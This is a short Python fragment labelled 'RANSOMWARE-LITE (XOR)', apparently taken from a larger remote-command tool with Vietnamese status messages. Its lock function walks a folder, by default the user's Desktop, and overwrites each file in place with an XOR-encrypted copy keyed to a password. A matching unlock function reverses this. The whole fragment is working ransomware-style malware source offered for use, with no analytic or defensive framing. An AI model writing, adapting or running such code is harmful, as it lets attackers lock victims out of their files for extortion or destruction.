          # ============================================================
          #  RANSOMWARE-LITE (XOR)
          # ============================================================
          _LOCK_MAGIC = b"SVCENC1"

          def _xor(data, pw):
              key = hashlib.sha256(pw.encode()).digest()
              return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

          def _walk_files(root):
              for dp, dn, fn in os.walk(root):
                  for f in fn:
                      yield os.path.join(dp, f)

          def f_lock(args):
              if not args: return "Dung: lock <pass> [thu muc]"
              pw = args[0]; root = os.path.expanduser(" ".join(args[1:]) or os.path.join(os.path.expanduser("~"), "Desktop"))
              if not os.path.isdir(root): return f"Khong thay thu muc: {root}"
              n = 0
              for fp in _walk_files(root):
                  try:
                      data = open(fp, "rb").read()
                      if data[:7] == _LOCK_MAGIC: continue
                      open(fp, "wb").write(_LOCK_MAGIC + _xor(data, pw)); n += 1
                  except Exception: pass
              return f"Da khoa {n} file trong {root}"

          def f_unlock(args):
              if not args: return "Dung: unlock <pass> [thu muc]"
              pw = args[0]; root = os.path.expanduser(" ".join(args[1:]) or os.path.join(os.path.expanduser("~"), "Desktop"))
              n = 0
              for fp in _walk_files(root):
                  try:
                      data = open(fp, "rb").read()
                      if data[:7] != _LOCK_MAGIC: continue
                      open(fp, "wb").write(_xor(data[7:], pw)); n += 1
                  except Exception: pass
              return f"Da mo {n} file trong {root}"

